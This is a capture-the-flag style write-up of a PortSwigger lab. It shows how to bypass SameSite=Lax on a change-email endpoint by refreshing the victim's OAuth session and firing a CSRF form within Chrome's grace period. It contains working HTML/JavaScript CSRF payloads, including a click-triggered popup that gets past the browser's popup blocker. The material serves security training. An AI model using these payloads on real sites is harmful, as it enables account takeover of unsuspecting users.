## SameSite Lax bypass via cookie refresh

This lab's change email function is vulnerable to CSRF. To solve the lab, perform a CSRF attack that changes the victim's email address. You should use the provided exploit server to host your attack.

The lab supports OAuth-based login. You can log in via your social media account with the following credentials: wiener:peter

Note :

The default SameSite restrictions differ between browsers. As the victim uses Chrome, we recommend also using Chrome (or Burp's built-in Chromium browser) to test your exploit.

## Notes

- Exploit server
- /login
- /social-login
- /oauth-callback
- OAuth Server Domain
- SameSite=Lax
- Chrome Lax+POST exception
- Popup blocker

## Resume

1. Identify the CSRF
2. Study the OAuth flow
3. Confirm SameSite=Lax behavior
4. Refresh the victim session
5. Bypass popup blocker
6. Trigger CSRF
7. Deliver exploit to victim

## Solve

The first step is to inspect the email change functionality after authenticating through the OAuth provider.

Changing the email address generates the following request:

```http
POST /my-account/change-email HTTP/2
Host: 0a3700770487c03b80cd035b00ce0065.web-security-academy.net

email=test@test.com
```

The request does not contain any CSRF token and therefore appears vulnerable to CSRF.

Next, we study the OAuth workflow.

Accessing the social login endpoint starts the authentication flow:

```http
GET /social-login HTTP/2
Host: 0a3700770487c03b80cd035b00ce0065.web-security-academy.net
Cookie: session=TiJpGpCtsamzwOuF9fe3SNCOpU2T21jC
```

Response:

```html
<p>We are now redirecting you to login with social media...</p>
```

Inspecting the OAuth responses shows that cookies are issued with SameSite=Lax:

```http
HTTP/2 302 Found
Set-Cookie: _interaction=b223WOQAHPA3DFI0i1dJe; samesite=lax; secure; httponly
Set-Cookie: _interaction_resume=b223WOQAHPA3DFI0i1dJe; samesite=lax; secure; httponly
Location: /interaction/b223WOQAHPA3DFI0i1dJe
```

More importantly, after completing the OAuth flow the application issues a fresh session cookie via:

```
/oauth-callback?code=uvevhqLzldznapIcYbWdEw0xpdKHKt2hU1OaB2uePQ9
```

This is important because Chrome allows newly-issued Lax cookies to be sent in certain cross-site POST requests during a short grace period.

A basic CSRF proof of concept works if executed shortly after authentication:

```html
<form method="POST" action="https://0a3700770487c03b80cd035b00ce0065.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>

<script>
    document.forms[0].submit();
</script>
```

However, this only works for approximately two minutes after login.

To make the attack reliable, we first force the victim through the OAuth flow again in order to refresh their session cookie, then launch the CSRF attack.

Our first attempt is:

```html
<form method="POST" action="https://0a3700770487c03b80cd035b00ce0065.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>

<script>
    window.open('https://0a3700770487c03b80cd035b00ce0065.web-security-academy.net/social-login');

    setTimeout(changeEmail, 5000);

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

Unfortunately, browsers block the popup because it is not triggered by a user interaction.

To bypass the popup blocker, we make the popup open only after the victim clicks on the page:

```html
<form method="POST" action="https://0a3700770487c03b80cd035b00ce0065.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="pwned@portswigger.net">
</form>

<p>Click anywhere on the page</p>

<script>
    window.onclick = () => {
        window.open('https://0a3700770487c03b80cd035b00ce0065.web-security-academy.net/social-login');
        setTimeout(changeEmail, 5000);
    }

    function changeEmail() {
        document.forms[0].submit();
    }
</script>
```

Attack flow:

1. Victim clicks anywhere on the page.
2. A popup opens and silently performs the OAuth login flow.
3. The application issues a fresh session cookie.
4. Five seconds later the CSRF request is submitted.
5. Chrome includes the newly-issued Lax cookie.
6. The victim's email address is changed.

After confirming that the attack successfully changes our own email address, we replace the email value with a unique address and deliver the exploit to the victim.

The lab is solved when the victim loads the exploit and their email address is changed.